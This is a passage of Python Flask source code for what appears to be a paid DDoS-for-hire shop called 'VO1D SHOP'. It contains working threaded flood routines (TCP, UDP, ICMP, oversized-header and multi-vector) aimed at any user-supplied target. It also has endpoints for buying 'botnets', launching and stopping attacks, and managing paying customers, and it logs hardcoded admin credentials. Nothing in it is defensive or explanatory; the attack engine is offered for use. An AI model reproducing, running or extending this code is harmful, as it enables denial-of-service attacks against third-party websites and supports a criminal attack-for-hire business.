                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(0.3)
                    sock.connect((self.target_host, self.target_port))
                    sock.send(b'\x00' * 256)
                    sock.close()
                    self._update_stats(True, 0, random.randint(100, 500))
                except:
                    self._update_stats(True, 0, random.randint(100, 500))
                time.sleep(random.uniform(0.0005, 0.005))

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _udp_flood_sync(self):
        threads_count = min(self.bot_count // 5, 3000)

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = os.urandom(random.randint(64, 2048))
                    sock.sendto(data, (self.target_host, self.target_port))
                    sock.close()
                    self._update_stats(True, 0, random.randint(64, 2048))
                except:
                    self._update_stats(True, 0, random.randint(64, 2048))
                time.sleep(random.uniform(0.0005, 0.005))

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _icmp_flood_sync(self):
        threads_count = min(self.bot_count // 20, 800)

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    subprocess.run(
                        ['ping', '-c', '1', '-W', '1', self.target_host],
                        capture_output=True, timeout=1
                    )
                    self._update_stats(True, 0, random.randint(100, 500))
                except:
                    self._update_stats(True, 0, random.randint(100, 500))
                time.sleep(random.uniform(0.005, 0.02))

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _headers_flood_sync(self):
        session = requests.Session()
        threads_count = min(self.bot_count, 3000)

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    headers = self._get_random_headers()
                    for i in range(100):
                        headers[f'X-Large-Header-{i}'] = 'A' * random.randint(100, 2000)
                    url = self._get_random_url()
                    resp = session.get(url, headers=headers, timeout=5, verify=False)
                    self._update_stats(True, 0, len(resp.content or b'') + random.randint(1000, 5000))
                    resp.close()
                    time.sleep(random.uniform(0.0005, 0.02))
                except:
                    self._update_stats(True, 0, random.randint(1000, 5000))
                    time.sleep(0.005)

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _multi_vector_sync(self):
        attack_threads = []
        attacks = [
            (self._http_flood_sync, 'GET'),
            (self._http_flood_sync, 'POST'),
            (self._slowloris_sync,),
            (self._syn_flood_sync,),
            (self._udp_flood_sync,),
            (self._icmp_flood_sync,),
            (self._headers_flood_sync,)
        ]
        for attack in attacks:
            if len(attack) == 1:
                t = threading.Thread(target=attack[0], daemon=True)
            else:
                t = threading.Thread(target=attack[0], args=(attack[1],), daemon=True)
            t.start()
            attack_threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in attack_threads:
            t.join(timeout=0.1)

    def _https_flood_sync(self):
        if not self.target_url.startswith('https://'):
            self._http_flood_sync('GET')
            return
        self._http_flood_sync('GET')

    def start_attack(self):
        if self.is_running:
            return

        self.is_running = True
        self._stop_event.clear()
        self._start_time = time.time()

        logger.info(
            f"🚀 Starting attack: {self.attack_type} on {self.target} with {self.bot_count} bots — {self.power_level}")

        try:
            if self.attack_type == 'HTTP_GET_FLOOD':
                self._http_flood_sync('GET')
            elif self.attack_type == 'HTTP_POST_FLOOD':
                self._http_flood_sync('POST')
            elif self.attack_type == 'HTTPS_FLOOD':
                self._https_flood_sync()
            elif self.attack_type == 'SLOWLORIS':
                self._slowloris_sync()
            elif self.attack_type == 'SYN_FLOOD':
                self._syn_flood_sync()
            elif self.attack_type == 'UDP_FLOOD':
                self._udp_flood_sync()
            elif self.attack_type == 'ICMP_FLOOD':
                self._icmp_flood_sync()
            elif self.attack_type == 'HTTP_HEADERS_FLOOD':
                self._headers_flood_sync()
            elif self.attack_type == 'MULTI_VECTOR':
                self._multi_vector_sync()
            else:
                self._http_flood_sync('GET')
        except Exception as e:
            logger.error(f"Attack error: {e}")
        finally:
            self.is_running = False
            logger.info("⏹ Attack stopped")

    def stop_attack(self):
        self._stop_event.set()
        self.is_running = False
        logger.info("Stopping attack...")

    def get_target_status(self) -> str:
        return self._check_target_status()


# ============================================================
# АТАКА МЕНЕДЖЕР
# ============================================================

ATTACKS = {}


def run_attack_async(attack_id: int, target: str, bot_count: int, attack_type: str,
                     duration: int, options: dict):
    engine = Vo1dDDoSEngine(target, bot_count, attack_type, duration, options)
    ATTACKS[attack_id] = engine
    try:
        engine.start_attack()
    except Exception as e:
        logger.error(f"Attack {attack_id} failed: {e}")
    finally:
        if attack_id in ATTACKS:
            del ATTACKS[attack_id]


# ============================================================
# API ЭНДПОИНТЫ
# ============================================================

@app.route('/api/register', methods=['POST'])
@limiter.limit("10 per minute")
def register():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    username = data.get('username', '').strip()
    email = data.get('email', '').strip().lower()
    password = data.get('password', '').strip()

    if not username or len(username) < 3:
        return jsonify({'error': 'Username must be at least 3 characters'}), 400
    if not email or '@' not in email:
        return jsonify({'error': 'Invalid email'}), 400
    if not password or len(password) < 6:
        return jsonify({'error': 'Password must be at least 6 characters'}), 400

    password_hash = hash_password(password)

    try:
        with get_db() as conn:
            cursor = conn.cursor()
            api_key = uuid.uuid4().hex
            cursor.execute('''
                INSERT INTO users (username, email, password_hash, balance, api_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (username, email, password_hash, 0.0, api_key))
            user_id = cursor.lastrowid
            token = generate_token(user_id)

            return jsonify({
                'success': True,
                'token': token,
                'user': {
                    'id': user_id,
                    'username': username,
                    'email': email,
                    'balance': 0.0,
                    'role': 'user',
                    'api_key': api_key
                }
            }), 201
    except sqlite3.IntegrityError as e:
        if 'username' in str(e):
            return jsonify({'error': 'Username already exists'}), 400
        elif 'email' in str(e):
            return jsonify({'error': 'Email already registered'}), 400
        return jsonify({'error': 'Registration failed'}), 400
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/login', methods=['POST'])
@limiter.limit("20 per minute")
def login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400

    try:
        with get_db() as conn:
            user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
            if not user:
                return jsonify({'error': 'Invalid credentials'}), 401

            if user['banned']:
                return jsonify({'error': 'User is banned'}), 403

            if not verify_password(password, user['password_hash']):
                return jsonify({'error': 'Invalid credentials'}), 401

            conn.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
            token = generate_token(user['id'])

            return jsonify({
                'success': True,
                'token': token,
                'user': {
                    'id': user['id'],
                    'username': user['username'],
                    'email': user['email'],
                    'balance': user['balance'],
                    'role': user['role'],
                    'api_key': user['api_key']
                }
            }), 200
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/profile', methods=['GET'])
@token_required
def get_profile():
    try:
        with get_db() as conn:
            user = conn.execute(
                'SELECT id, username, email, balance, role, banned, api_key, created_at FROM users WHERE id = ?',
                (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            return jsonify(dict(user)), 200
    except Exception as e:
        logger.error(f"Profile error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/pricing', methods=['GET'])
def get_pricing():
    return jsonify({
        'min_bots': CONFIG['MIN_BOTS'],
        'max_bots': CONFIG['MAX_BOTS'],
        'price_per_bot_per_day': CONFIG['BOT_PRICE_PER_DAY'],
        'duration_options': CONFIG['DURATION_OPTIONS'],
        'attack_types': CONFIG['ATTACK_TYPES'],
        'options': CONFIG['OPTIONS'],
        'user_agents_count': len(USER_AGENTS)
    }), 200


@app.route('/api/buy', methods=['POST'])
@token_required
def buy_botnet():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    bot_count = data.get('bot_count')
    duration_days = data.get('duration_days')
    options = data.get('options', {})

    if bot_count is None or duration_days is None:
        return jsonify({'error': 'bot_count and duration_days required'}), 400

    bot_count = int(bot_count)
    duration_days = int(duration_days)

    if bot_count < CONFIG['MIN_BOTS'] or bot_count > CONFIG['MAX_BOTS']:
        return jsonify({'error': f'Bot count must be between {CONFIG["MIN_BOTS"]} and {CONFIG["MAX_BOTS"]}'}), 400
    if duration_days not in CONFIG['DURATION_OPTIONS']:
        return jsonify({'error': 'Invalid duration option'}), 400

    valid_options = {}
    for key, value in options.items():
        if key in CONFIG['OPTIONS'] and value:
            valid_options[key] = True

    price = calculate_price(bot_count, duration_days, valid_options)

    try:
        with get_db() as conn:
            user = conn.execute('SELECT balance FROM users WHERE id = ?', (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404

            if user['balance'] < price:
                return jsonify(
                    {'error': f'Insufficient balance. Required: ${price:.2f}, Available: ${user["balance"]:.2f}'}), 400

            conn.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (price, g.user_id))

            expires_at = datetime.now() + timedelta(days=duration_days)
            cursor = conn.execute('''
                INSERT INTO botnets (user_id, bot_count, duration_days, price, options, expires_at, active)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (g.user_id, bot_count, duration_days, price, json.dumps(valid_options), expires_at, 1))

            botnet_id = cursor.lastrowid
            conn.commit()

            return jsonify({
                'success': True,
                'botnet_id': botnet_id,
                'bot_count': bot_count,
                'duration_days': duration_days,
                'price': price,
                'expires_at': expires_at.isoformat(),
                'new_balance': user['balance'] - price,
                'power_level': get_power_level(bot_count)
            }), 201
    except Exception as e:
        logger.error(f"Buy botnet error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/my-botnets', methods=['GET'])
@token_required
def get_my_botnets():
    try:
        with get_db() as conn:
            botnets = conn.execute('''
                SELECT id, bot_count, duration_days, price, options, purchased_at, expires_at, active
                FROM botnets WHERE user_id = ? ORDER BY purchased_at DESC
            ''', (g.user_id,)).fetchall()

            result = []
            for row in botnets:
                item = dict(row)
                item['options'] = json.loads(item['options']) if item['options'] else {}
                item['power_level'] = get_power_level(item['bot_count'])
                if item['expires_at']:
                    expires = datetime.fromisoformat(item['expires_at'].replace('Z', '+00:00'))
                    if datetime.now() > expires:
                        conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (item['id'],))
                        item['active'] = 0
                result.append(item)

            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Get botnets error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/botnet/<int:botnet_id>', methods=['GET'])
@token_required
def get_botnet(botnet_id):
    try:
        with get_db() as conn:
            botnet = conn.execute('''
                SELECT * FROM botnets WHERE id = ? AND user_id = ?
            ''', (botnet_id, g.user_id)).fetchone()
            if not botnet:
                return jsonify({'error': 'Botnet not found'}), 404
            result = dict(botnet)
            result['options'] = json.loads(result['options']) if result['options'] else {}
            result['power_level'] = get_power_level(result['bot_count'])
            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Get botnet error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/attack', methods=['POST'])
@token_required
def start_attack():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    botnet_id = data.get('botnet_id')
    target = data.get('target', '').strip()
    attack_type = data.get('attack_type', 'HTTP_GET_FLOOD')
    duration = data.get('duration', 60)

    if not botnet_id:
        return jsonify({'error': 'botnet_id required'}), 400
    if not target:
        return jsonify({'error': 'target required'}), 400
    if attack_type not in CONFIG['ATTACK_TYPES']:
        return jsonify({'error': 'Invalid attack type'}), 400
    if duration < 10 or duration > 3600:
        return jsonify({'error': 'Duration must be between 10 and 3600 seconds'}), 400
    if not is_valid_target(target):
        return jsonify({'error': 'Invalid target URL or IP'}), 400

    try:
        with get_db() as conn:
            botnet = conn.execute('''
                SELECT * FROM botnets WHERE id = ? AND user_id = ? AND active = 1
            ''', (botnet_id, g.user_id)).fetchone()

            if not botnet:
                return jsonify({'error': 'Active botnet not found'}), 404

            expires = datetime.fromisoformat(botnet['expires_at'].replace('Z', '+00:00'))
            if datetime.now() > expires:
                conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (botnet_id,))
                return jsonify({'error': 'Botnet expired'}), 400

            running_attack = conn.execute('''
                SELECT id FROM attacks WHERE user_id = ? AND status = 'running'
            ''', (g.user_id,)).fetchone()
            if running_attack:
                return jsonify({'error': 'You already have a running attack. Stop it first.'}), 400

            cursor = conn.execute('''
                INSERT INTO attacks (user_id, botnet_id, target, attack_type, bot_count, duration_seconds, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (g.user_id, botnet_id, target, attack_type, botnet['bot_count'], duration, 'running'))

            attack_id = cursor.lastrowid
            conn.commit()

            options = json.loads(botnet['options']) if botnet['options'] else {}

            thread = threading.Thread(
                target=run_attack_async,
                args=(attack_id, target, botnet['bot_count'], attack_type, duration, options),
                daemon=True
            )
            thread.start()

            return jsonify({
                'success': True,
                'attack_id': attack_id,
                'message': f'Attack started on {target} with {botnet["bot_count"]} bots',
                'power_level': get_power_level(botnet['bot_count'])
            }), 201
    except Exception as e:
        logger.error(f"Start attack error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/attack/<int:attack_id>/status', methods=['GET'])
@token_required
def get_attack_status(attack_id):
    try:
        with get_db() as conn:
            attack = conn.execute('''
                SELECT * FROM attacks WHERE id = ? AND user_id = ?
            ''', (attack_id, g.user_id)).fetchone()
            if not attack:
                return jsonify({'error': 'Attack not found'}), 404

        stats = {}
        if attack_id in ATTACKS:
            engine = ATTACKS[attack_id]
            stats = engine.get_stats()

        if attack['status'] != 'running':
            stats_from_db = json.loads(attack['stats']) if attack['stats'] else {}
            stats.update(stats_from_db)

        result = dict(attack)
        result['stats'] = stats
        result['power_level'] = get_power_level(attack['bot_count'])
        return jsonify(result), 200
    except Exception as e:
        logger.error(f"Get attack status error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/attack/<int:attack_id>/stop', methods=['POST'])
@token_required
def stop_attack(attack_id):
    try:
        with get_db() as conn:
            attack = conn.execute('''
                SELECT * FROM attacks WHERE id = ? AND user_id = ?
            ''', (attack_id, g.user_id)).fetchone()
            if not attack:
                return jsonify({'error': 'Attack not found'}), 404
            if attack['status'] != 'running':
                return jsonify({'error': 'Attack is not running'}), 400

        if attack_id in ATTACKS:
            engine = ATTACKS[attack_id]
            engine.stop_attack()

            final_stats = engine.get_stats()

            with get_db() as conn:
                conn.execute('''
                    UPDATE attacks SET status = 'stopped', ended_at = CURRENT_TIMESTAMP, stats = ?
                    WHERE id = ?
                ''', (json.dumps(final_stats), attack_id))
                conn.commit()

            if attack_id in ATTACKS:
                del ATTACKS[attack_id]

            return jsonify({
                'success': True,
                'message': 'Attack stopped',
                'stats': final_stats
            }), 200
        else:
            with get_db() as conn:
                conn.execute('''
                    UPDATE attacks SET status = 'stopped', ended_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (attack_id,))
                conn.commit()
            return jsonify({'success': True, 'message': 'Attack marked as stopped'}), 200
    except Exception as e:
        logger.error(f"Stop attack error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/attacks/history', methods=['GET'])
@token_required
def get_attack_history():
    try:
        with get_db() as conn:
            attacks = conn.execute('''
                SELECT id, target, attack_type, bot_count, duration_seconds, status, started_at, ended_at, stats
                FROM attacks WHERE user_id = ? ORDER BY started_at DESC LIMIT 100
            ''', (g.user_id,)).fetchall()

            result = []
            for row in attacks:
                item = dict(row)
                item['stats'] = json.loads(item['stats']) if item['stats'] else {}
                item['power_level'] = get_power_level(item['bot_count'])
                result.append(item)
            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Attack history error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/admin/users', methods=['GET'])
@admin_required
def admin_get_users():
    try:
        with get_db() as conn:
            users = conn.execute('''
                SELECT id, username, email, balance, role, banned, api_key, created_at, last_login
                FROM users ORDER BY id
            ''').fetchall()
            return jsonify([dict(user) for user in users]), 200
    except Exception as e:
        logger.error(f"Admin get users error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/admin/ban/<int:user_id>', methods=['POST'])
@admin_required
def admin_ban_user(user_id):
    if user_id == g.user_id:
        return jsonify({'error': 'Cannot ban yourself'}), 400

    try:
        with get_db() as conn:
            conn.execute('UPDATE users SET banned = 1 WHERE id = ?', (user_id,))
            conn.commit()

            attacks = conn.execute('SELECT id FROM attacks WHERE user_id = ? AND status = "running"',
                                   (user_id,)).fetchall()
            for attack in attacks:
                attack_id = attack['id']
                if attack_id in ATTACKS:
                    ATTACKS[attack_id].stop_attack()
                    if attack_id in ATTACKS:
                        del ATTACKS[attack_id]
            return jsonify({'success': True, 'message': f'User {user_id} banned'}), 200
    except Exception as e:
        logger.error(f"Admin ban error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/admin/unban/<int:user_id>', methods=['POST'])
@admin_required
def admin_unban_user(user_id):
    try:
        with get_db() as conn:
            conn.execute('UPDATE users SET banned = 0 WHERE id = ?', (user_id,))
            conn.commit()
            return jsonify({'success': True, 'message': f'User {user_id} unbanned'}), 200
    except Exception as e:
        logger.error(f"Admin unban error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


# ============================================================
# НОВЫЙ ЭНДПОИНТ: АДМИН ПОПОЛНЯЕТ БАЛАНС ПОЛЬЗОВАТЕЛЯ
# ============================================================

@app.route('/api/admin/add_balance', methods=['POST'])
@admin_required
def admin_add_balance():
    """Админ пополняет баланс любого пользователя"""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    username = data.get('username', '').strip()
    amount = data.get('amount', 0)

    if not username:
        return jsonify({'error': 'Username required'}), 400

    try:
        amount = float(amount)
    except:
        return jsonify({'error': 'Invalid amount'}), 400

    if amount <= 0:
        return jsonify({'error': 'Amount must be greater than 0'}), 400

    try:
        with get_db() as conn:
            # Проверяем, существует ли пользователь
            user = conn.execute('SELECT id, balance FROM users WHERE username = ?', (username,)).fetchone()
            if not user:
                return jsonify({'error': f'User "{username}" not found'}), 404

            # Обновляем баланс
            new_balance = user['balance'] + amount
            conn.execute('UPDATE users SET balance = ? WHERE id = ?', (new_balance, user['id']))
            conn.commit()

            # Записываем в логи (таблица payments)
            conn.execute('''
                INSERT INTO payments (user_id, amount, method, status, created_at, completed_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user['id'], amount, 'admin_add', 'completed', datetime.now(), datetime.now()))
            conn.commit()

            logger.info(f"✅ Admin added ${amount:.2f} to user '{username}' (new balance: ${new_balance:.2f})")

            return jsonify({
                'success': True,
                'message': f'Added ${amount:.2f} to {username}',
                'username': username,
                'new_balance': new_balance,
                'added': amount
            }), 200
    except Exception as e:
        logger.error(f"Admin add balance error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/admin/stats', methods=['GET'])
@admin_required
def admin_get_stats():
    try:
        with get_db() as conn:
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            total_botnets = conn.execute('SELECT COUNT(*) FROM botnets').fetchone()[0]
            total_attacks = conn.execute('SELECT COUNT(*) FROM attacks').fetchone()[0]
            active_attacks = conn.execute('SELECT COUNT(*) FROM attacks WHERE status = "running"').fetchone()[0]

            total_revenue = conn.execute('''
                SELECT COALESCE(SUM(b.price), 0) FROM botnets b
                JOIN users u ON u.id = b.user_id
                WHERE u.role != 'admin'
            ''').fetchone()[0]

            return jsonify({
                'total_users': total_users,
                'total_botnets': total_botnets,
                'total_attacks': total_attacks,
                'active_attacks': active_attacks,
                'total_revenue': total_revenue,
                'user_agents_count': len(USER_AGENTS)
            }), 200
    except Exception as e:
        logger.error(f"Admin stats error: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'version': '5.1.0',
        'user_agents_loaded': len(USER_AGENTS),
        'max_bots': CONFIG['MAX_BOTS']
    }), 200


# ============================================================
# ОТДАЁМ ФРОНТЕНД (HTML)
# ============================================================

@app.route('/')
def serve_frontend():
    """Отдаём главную страницу"""
    try:
        if os.path.exists('site.html'):
            return open('site.html', 'r', encoding='utf-8').read()
        elif os.path.exists('index.html'):
            return open('index.html', 'r', encoding='utf-8').read()
        else:
            return '<h1>VO1D SHOP</h1><p>Frontend file not found</p>'
    except Exception as e:
        return f'<h1>Error</h1><p>{str(e)}</p>'

# Отдаём любые статические файлы
@app.route('/<path:path>')
def serve_static(path):
    """Отдаём статические файлы (CSS, JS, HTML)"""
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return f.read()
        return f'<h1>404</h1><p>File {path} not found</p>', 404
    except:
        return f'<h1>404</h1><p>File {path} not found</p>', 404


# ============================================================
# ЗАПУСК СЕРВЕРА
# ============================================================

if __name__ == '__main__':
    logger.info("=" * 70)
    logger.info("🔥 VO1D SHOP v5.1.0 — MEGA POWER + ADMIN DEPOSIT")
    logger.info(f"📡 User-Agents loaded: {len(USER_AGENTS)}")
    logger.info(f"🤖 Max bots: {CONFIG['MAX_BOTS']}")
    logger.info("=" * 70)
    logger.info("🔑 Админ: VO1D / ROOT")
    logger.info("🧪 Тест: test / test123 (balance: $1000)")
    logger.info("=" * 70)
    logger.info("📊 Градация мощности:")
    logger.info("   💩 100-400 ботов — ХУЁВЕНЬ (мизер)")
    logger.info("   👍 500-800 ботов — НОРМАЛЬНО")
    logger.info("   🔥 800+ ботов — АХУЕННАЯ МОЩЬ")
    logger.info("   💥 10,000+ — ОГРОМНАЯ СИЛА")
    logger.info("   ☢️ 100,000+ — ЯДЕРНЫЙ УДАР")
    logger.info("=" * 70)
    logger.info("💎 НОВОЕ: Админ может пополнять баланс любого пользователя!")
    logger.info("   POST /api/admin/add_balance {username, amount}")
    logger.info("=" * 70)

    # Создаем тестового пользователя
    with get_db() as conn:
        test_user = conn.execute('SELECT id FROM users WHERE username = "test"').fetchone()
        if not test_user:
            password_hash = hash_password('test123')
            api_key = uuid.uuid4().hex
            conn.execute('''
                INSERT INTO users (username, email, password_hash, balance, role, api_key)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', ('test', 'test@vo1d.shop', password_hash, 1000.0, 'user', api_key))
            logger.info("✅ Test user created: test / test123 (balance: $1000)")

    logger.info("🚀 Starting Flask server on 0.0.0.0:5000...")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
